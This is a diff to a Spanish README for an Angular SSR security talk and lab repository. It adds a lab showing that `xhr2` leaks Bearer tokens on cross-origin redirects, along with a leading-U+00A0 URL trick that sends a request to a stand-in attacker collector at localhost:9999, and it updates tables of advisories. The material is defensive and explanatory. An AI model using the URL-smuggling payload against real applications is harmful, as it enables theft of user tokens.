@@ -53,7 +53,7 @@ La charla sigue un `http.get('/api/me')` por cinco fronteras. En cada una hay un
 | --- | --- | --- | --- |
 | 1 · La URL: otro parser | 1 | `/promos`, `npm run lab:urls` | [GHSA-jfgx-762w-99vr](https://github.com/angular/angular/security/advisories/GHSA-jfgx-762w-99vr) |
 | 2 · El SSR: otro proceso | 2, extra | `npm run lab:host` | [GHSA-w739-gvwx-grc3](https://github.com/angular/angular/security/advisories/GHSA-w739-gvwx-grc3), con [su PoC](https://github.com/SkyZeroZx/angular-ssr-router-open-redirect) |
-| 3 · Los redirects: otro destino | 3 | `npm run lab:redirect` | [CVE-2026-54264](https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p) |
+| 3 · Los redirects: otro destino | 3, XHR | `npm run lab:redirect`, `npm run lab:xhr` | [CVE-2026-54264](https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p), [#70540](https://github.com/angular/angular/issues/70540) (sin CVE) |
 | 4 · El HTML: otro lector | 4 | `/`, `npm run lab:cache` | [CVE-2026-88059](https://github.com/angular/angular/security/advisories/GHSA-p297-fm68-3q8c), [CVE-2026-54267](https://github.com/angular/angular/security/advisories/GHSA-rgjc-h3x7-9mwg) |
 | 5 · El Service Worker: otro intermediario | 5 | `/orders`, en el navegador | [CVE-2026-50184](https://github.com/angular/angular/security/advisories/GHSA-95qp-cmmw-mgqv) |
 
@@ -140,6 +140,32 @@ curl -H "X-Internal-Key: sk_internal_corner_shop_demo" -H "X-Session: sid_ana_�
 
 En `safe`, las llamadas a tu API llevan `redirect: 'error'`, en el servidor y en el navegador, y la página dice "Deals unavailable". El subdominio sigue siendo del atacante. Eso se arregla borrando el CNAME y el redirect, no en Angular.
 
+### Lab XHR: el cliente HTTP del servidor
+
+Con `provideHttpClient(withXhr())`, el SSR hace sus requests con `xhr2` (`ServerXhr` de `@angular/platform-server`). Está deprecado desde 22.0.1, 21.2.17 y 20.3.25 y se elimina en Angular 23. La razón es que `xhr2` no maneja bien los redirects: reenvía `Authorization` a otro origen y no corta los loops de redirects. Desde Angular 22, el backend por defecto es `fetch`.
+
+```bash
+npm run lab:xhr
+```
+
+```text
+$ fetch GET http://localhost:3000/api/deals/today
+[attacker] GET /deals/today.json  (nothing interesting)
+
+$ xhr2  GET http://localhost:3000/api/deals/today
+[attacker] GET /deals/today.json  authorization=Bearer at_ana_…
+
+new URL() resolves it to http://localhost:4000/%C2%A0http://localhost:9999/collect?lab=xhr  same origin
+$ xhr2  GET "\u00A0http://localhost:9999/collect?lab=xhr"
+[attacker] GET /collect?lab=xhr  authorization=Bearer at_ana_…
+```
+
+El mismo Bearer y el mismo 302 a otro origen. `fetch` borra `Authorization`. `xhr2` lo manda.
+
+La segunda parte es [angular/angular#70540](https://github.com/angular/angular/issues/70540), sin CVE. Angular decidía si la URL era absoluta con `String.prototype.trim()`, que también borra espacios Unicode como `U+00A0`, y a `xhr2` le pasaba el string original. Para `new URL()` esa URL es una ruta de tu origen, así que tu interceptor le pone el token. `xhr2` la lee con el parser antiguo de Node y la manda a otro host. Está corregido en 22.1.8 y 22.2.0 ([#70542](https://github.com/angular/angular/pull/70542)), y el PoC está en [angular-serverxhr-poc](https://github.com/SkyZeroZx/angular-serverxhr-poc). El lab llama a `xhr2` directo para mostrar el parser; la app de la demo usa `fetch`.
+
+En una app con SSR, no uses `withXhr()`.
+
 ### Lab 4: el HTML también es una API
 
 La home muestra "Hi, Ana" con datos de `/api/me`. En SSR, el interceptor reenvía la sesión como `X-Session`, un header que `HttpTransferCache` no reconoce como credencial. La respuesta termina en `<script id="ng-state">` y el HTML queda en un caché compartido que no mira cookies.
@@ -198,7 +224,7 @@ apps/
   attacker/    NestJS: CORS abierto y un log de lo que llega
 tools/
   stack.mjs    levanta los tres servidores
-  labs.mjs     Labs 2, 3 y 4 sin escribir curl
+  labs.mjs     Labs 2, 3, 4 y XHR sin escribir curl
   url-lab.mjs  Lab 1 sin navegador
   verify.mjs   los cinco labs, en los dos modos, con Chrome headless
 ```
@@ -212,6 +238,7 @@ tools/
 | La URL | [GHSA-jfgx-762w-99vr](https://github.com/angular/angular/security/advisories/GHSA-jfgx-762w-99vr): XSRF token leak por discrepancia de parsers (fix incompleto de CVE-2025-66035) | lo encontré |
 | El SSR | [GHSA-w739-gvwx-grc3](https://github.com/angular/angular/security/advisories/GHSA-w739-gvwx-grc3): open redirect con URLs protocol-relative en SSR | lo encontré |
 | Los redirects | [CVE-2026-54264](https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p): el Service Worker reenviaba headers sensibles en redirects a otro origen | lo arreglé |
+| Los redirects | [#70540](https://github.com/angular/angular/issues/70540), sin CVE: `ServerXhr` mandaba a otro origen una URL que `new URL()` daba por propia | lo encontré y lo arreglé |
 | El HTML | [CVE-2026-88059](https://github.com/angular/angular/security/advisories/GHSA-p297-fm68-3q8c): bypass de `HttpTransferCache` con `withRequestsMadeViaParent` | lo arreglé |
 | El HTML | [CVE-2026-54267](https://github.com/angular/angular/security/advisories/GHSA-rgjc-h3x7-9mwg): DOM clobbering de `ng-state` en la hidratación | lo reporté |
 | El HTML | [CVE-2026-50556](https://github.com/angular/angular/security/advisories/GHSA-gxx4-3xcv-f8qx): XSS por no escapar `<noscript>` en SSR | lo arreglé |
